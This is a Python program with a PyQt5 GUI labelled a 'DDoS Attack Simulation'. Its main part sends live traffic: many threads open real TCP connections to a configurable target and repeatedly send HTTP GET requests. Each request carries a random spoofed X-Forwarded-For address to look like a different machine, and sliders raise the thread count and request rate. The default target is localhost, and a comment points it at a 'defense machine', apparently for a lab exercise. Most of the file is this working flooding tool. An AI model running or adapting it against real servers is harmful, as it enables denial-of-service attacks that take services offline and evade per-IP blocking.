import sys
import socket
import threading
import time
import random
import pyqtgraph as pg
import numpy as np
from PyQt5.QtWidgets import QApplication, QMainWindow, QVBoxLayout, QWidget, QLabel, QSlider, QListWidget, QListWidgetItem, QProgressBar, QSplitter
from PyQt5.QtCore import Qt
from PyQt5.QtGui import QColor


class AttackApp(QMainWindow):
    def __init__(self, target_ip, target_port, number_of_machines):
        super().__init__()

        self.target_ip = target_ip
        self.target_port = target_port
        self.number_of_machines = number_of_machines
        self.attack_speed = 5  # Default attack speed
        self.attacking_threads = []  # Store active attack threads

        # Generate random IPs for each machine
        self.machine_ips = [self.generate_random_ip() for _ in range(self.number_of_machines)]
        self.stop_threads = False  # Control flag for stopping threads

        # GUI setup
        self.setWindowTitle("DDoS Attack Simulation")
        self.setGeometry(200, 200, 1200, 800)

        # Main layout
        self.main_layout = QVBoxLayout()

        # Network map visualization (1/3 of the window height)
        self.network_map_widget = pg.PlotWidget()
        self.network_map_widget.setBackground('w')
        self.network_map_widget.setTitle("Network Map")
        self.main_layout.addWidget(self.network_map_widget)
        self.main_layout.setStretch(0, 1)  # 1/3 height for the network map

        # Attack controls and machine statuses
        self.splitter = QSplitter(Qt.Horizontal)
        self.left_panel = QWidget()
        self.splitter.addWidget(self.left_panel)
        self.main_layout.addWidget(self.splitter)

        # Set layout to main window
        container = QWidget()
        container.setLayout(self.main_layout)
        self.setCentralWidget(container)

        # Initialize the left panel for attack controls
        self.init_left_panel()

        # Initialize network map visualization
        self.init_network_map()

        # Start the attack in separate threads
        self.start_attack()

    def generate_random_ip(self):
        """Generate a random IP address to simulate different attacking machines."""
        return f"192.168.{random.randint(0, 255)}.{random.randint(0, 255)}"

    def init_left_panel(self):
        """Initialize the left panel for attack settings and machine statuses."""
        left_layout = QVBoxLayout()

        # Attack options
        self.label_machine_count = QLabel('Number of Machines:')
        left_layout.addWidget(self.label_machine_count)
        self.slider_machine_count = QSlider(Qt.Horizontal)
        self.slider_machine_count.setMinimum(10)
        self.slider_machine_count.setMaximum(100)
        self.slider_machine_count.setValue(self.number_of_machines)
        self.slider_machine_count.valueChanged.connect(self.update_machine_count)
        left_layout.addWidget(self.slider_machine_count)

        self.label_attack_speed = QLabel('Attack Speed:')
        left_layout.addWidget(self.label_attack_speed)
        self.slider_attack_speed = QSlider(Qt.Horizontal)
        self.slider_attack_speed.setMinimum(1)
        self.slider_attack_speed.setMaximum(10)
        self.slider_attack_speed.setValue(self.attack_speed)
        self.slider_attack_speed.valueChanged.connect(self.update_attack_speed)
        left_layout.addWidget(self.slider_attack_speed)

        # Progress Bar for attack stages
        self.progress_bar = QProgressBar()
        self.progress_bar.setRange(0, 100)
        left_layout.addWidget(self.progress_bar)

        # List of machines
        self.list_widget = QListWidget()
        left_layout.addWidget(self.list_widget)

        self.left_panel.setLayout(left_layout)

    def start_attack(self):
        """Start the DDoS attack by launching multiple threads (machines)."""
        self.stop_threads = False
        for i in range(self.number_of_machines):
            thread = threading.Thread(target=self.send_requests, args=(i,))
            self.attacking_threads.append(thread)
            thread.start()

    def stop_attack(self):
        """Stop all active attack threads."""
        self.stop_threads = True
        for thread in self.attacking_threads:
            thread.join()  # Ensure all threads are properly terminated
        self.attacking_threads = []

    def update_machine_count(self):
        """Update the number of machines based on the slider."""
        new_machine_count = self.slider_machine_count.value()

        if new_machine_count != self.number_of_machines:
            # Stop current attacks
            self.stop_attack()

            # Update the number of machines
            self.number_of_machines = new_machine_count
            self.machine_ips = [self.generate_random_ip() for _ in range(self.number_of_machines)]

            # Clear existing machine statuses and start new attack threads
            self.list_widget.clear()
            self.start_attack()

            # Update the network map
            self.init_network_map()

    def update_attack_speed(self):
        """Update the attack speed for all machines."""
        self.attack_speed = self.slider_attack_speed.value()

    def send_requests(self, machine_index):
        """Simulate a single machine sending attack requests."""
        ip = self.machine_ips[machine_index]  # Use the randomly generated IP for this machine
        while not self.stop_threads:
            try:
                client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                client.connect((self.target_ip, self.target_port))

                self.update_status(machine_index, "Connected", "green")

                while not self.stop_threads:
                    message = f"GET / HTTP/1.1\r\nHost: {self.target_ip}\r\nX-Forwarded-For: {ip}\r\n\r\n"
                    client.send(message.encode())
                    time.sleep(1 / self.attack_speed)

            except Exception as e:
                self.update_status(machine_index, "Blocked", "red")
                time.sleep(3)

    def update_status(self, machine_index, status, color):
        """Update the status and color of a specific machine."""
        ip = self.machine_ips[machine_index]
        item = self.list_widget.item(machine_index)
        if not item:
            item = QListWidgetItem(f"Machine {machine_index + 1} (IP: {ip}): {status}")
            item.setForeground(QColor(color))
            self.list_widget.addItem(item)
        else:
            item.setText(f"Machine {machine_index + 1} (IP: {ip}): {status}")
            item.setForeground(QColor(color))

    def init_network_map(self):
        """Initialize network map to visualize attacks."""
        self.network_map_widget.clear()
        x = np.random.normal(size=self.number_of_machines)
        y = np.random.normal(size=self.number_of_machines)
        self.scatter = pg.ScatterPlotItem(pen=pg.mkPen(width=1), brush='b', size=10)
        self.scatter.setData(x, y)
        self.network_map_widget.addItem(self.scatter)

        # Add the server node in the center
        self.server_node = pg.ScatterPlotItem(pen=pg.mkPen(width=3), brush='r', size=15)
        self.server_node.setData([0], [0])
        self.network_map_widget.addItem(self.server_node)

        # Draw lines representing connections between machines and the server
        for i in range(self.number_of_machines):
            line = pg.PlotDataItem(pen=pg.mkPen('green', width=1))
            self.network_map_widget.addItem(line)
            line.setData([x[i], 0], [y[i], 0])  # Connect machine to server

def run_attack_gui(target_ip, target_port, number_of_machines):
    """Run the attack simulation with a GUI."""
    app = QApplication(sys.argv)
    attack_app = AttackApp(target_ip, target_port, number_of_machines)
    attack_app.show()
    sys.exit(app.exec_())

if __name__ == "__main__":
    target_ip = "127.0.0.1"  # Target server IP (replace with the defense machine's IP)
    target_port = 8080  # Server port
    number_of_machines = 50  # Number of simulated machines

    run_attack_gui(target_ip, target_port, number_of_machines)
